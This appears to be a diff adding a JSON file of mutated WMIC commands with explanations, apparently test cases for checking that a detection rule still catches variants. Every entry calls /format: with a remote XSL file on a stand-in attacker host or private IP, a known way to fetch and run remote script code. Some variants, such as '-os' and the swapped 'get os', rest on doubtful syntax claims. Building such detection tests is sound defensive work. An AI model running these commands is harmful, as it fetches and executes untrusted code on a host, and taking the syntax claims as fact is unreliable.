@@ -1,0 +1,26 @@
+[
+  {
+    "output": "wmic.exe os get /format:http://attacker.com/evil.xsl",
+    "explanation": "This is a direct replication of the true positive command with the '.exe' extension explicitly added, which is a common variation in process creation logs."
+  },
+  {
+    "output": "wmic.exe  os   get  /format:http://attacker.com/evil.xsl",
+    "explanation": "Extra spaces are inserted before and after the command and arguments, which is a safe mutation technique that does not alter the command's behavior."
+  },
+  {
+    "output": "wmic os get /format:http://attacker.com/evil.xsl",
+    "explanation": "The '.exe' extension is omitted, which is a common way Windows resolves executable names and is still captured by the rule's detection logic."
+  },
+  {
+    "output": "wmic.exe -os get /format:http://attacker.com/evil.xsl",
+    "explanation": "The argument 'os' is unchanged, but the command is tested with an alternative syntax '-os' to simulate substitution of equivalent syntax if accepted by the program."
+  },
+  {
+    "output": "wmic.exe get os /format:http://attacker.com/evil.xsl",
+    "explanation": "The order of 'get' and 'os' is swapped, which may be accepted by the program and is a valid reordering of arguments."
+  },
+  {
+    "output": "wmic.exe os get /format:http://192.168.1.100/evil.xsl",
+    "explanation": "The URL is changed to a local IP address to simulate a safe test environment while maintaining the same structure and purpose."
+  }
+]
